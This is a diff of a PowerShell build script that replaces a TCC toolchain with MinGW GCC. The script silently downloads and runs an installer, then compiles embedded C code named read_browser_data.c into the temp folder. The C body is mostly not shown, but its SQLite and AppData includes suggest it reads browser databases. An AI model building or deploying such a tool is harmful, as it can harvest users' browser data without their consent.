@@ -1,31 +1,17 @@
 # Define the URL for the SQLite amalgamation ZIP file
 $headerUrl = "https://www.sqlite.org/2024/sqlite-amalgamation-3470000.zip"
 $headerZipPath = "$env:TEMP\sqlite-amalgamation.zip"
-$tccIncludePath = "C:\Program Files (x86)\tcc-0.9.27\include"
-
-# Download the SQLite amalgamation ZIP file
-Write-Output "Downloading SQLite amalgamation..."
-Invoke-WebRequest -Uri $headerUrl -OutFile $headerZipPath
-
-# Extract the SQLite amalgamation ZIP file
-Write-Output "Extracting SQLite amalgamation..."
-Expand-Archive -Path $headerZipPath -DestinationPath $env:TEMP -Force
-
-# Copy sqlite3.h to TCC include directory
-Write-Output "Copying sqlite3.h to TCC include directory..."
-Copy-Item -Path "$env:TEMP\sqlite-amalgamation-3470000\sqlite3.h" -Destination $tccIncludePath
-
-# Clean up SQLite amalgamation ZIP file
-Remove-Item -Path $headerZipPath
+$gccIncludePath = "C:\MinGW\include"
+$gccLibPath = "C:\MinGW\lib"
 
 # Define the C code
-$cCode = @'
+$cCode = @"
 #include <stdio.h>
-#include <sqlite3.h>
 #include <stdlib.h>
 #include <string.h>
 #include <windows.h>
 #include <shlobj.h> // Include this header for SHGetFolderPathA and CSIDL_APPDATA
+#include "sqlite3.h" // Include SQLite header
 
 #ifndef _WIN32_WINNT
 #define _WIN32_WINNT 0x0500 // Define this to use SHGetFolderPathA
@@ -145,15 +131,29 @@ int main() {
 
     return 0;
 }
-'@
+"@
+
+# Download and install MinGW
+$mingwInstallerUrl = "https://osdn.net/frs/redir.php?m=constant&f=mingw%2F68260%2Fmingw-get-setup.exe"
+$mingwInstallerPath = "$env:TEMP\mingw-get-setup.exe"
+
+Write-Output "Downloading MinGW installer..."
+Invoke-WebRequest -Uri $mingwInstallerUrl -OutFile $mingwInstallerPath
+
+Write-Output "Installing MinGW..."
+Start-Process -FilePath $mingwInstallerPath -ArgumentList "/silent" -Wait
+
+# Install necessary MinGW packages
+Write-Output "Installing MinGW packages..."
+& "C:\MinGW\bin\mingw-get.exe" install mingw32-gcc-objc mingw32-gcc-g++ -quiet
 
 # Write the C code to a file
 $cFilePath = "$env:TEMP\read_browser_data.c"
 Set-Content -Path $cFilePath -Value $cCode
 
-# Compile the C code using TCC
+# Compile the C code using GCC
 Write-Output "Compiling the C code..."
-tcc -o "$env:TEMP\read_browser_data.exe" $cFilePath -lsqlite3 -lShell32
+gcc -o "$env:TEMP\read_browser_data.exe" $cFilePath -IC:\MinGW\include -LC:\MinGW\lib -lsqlite3 -lShell32
 
 Write-Output "Compilation completed successfully!"
 
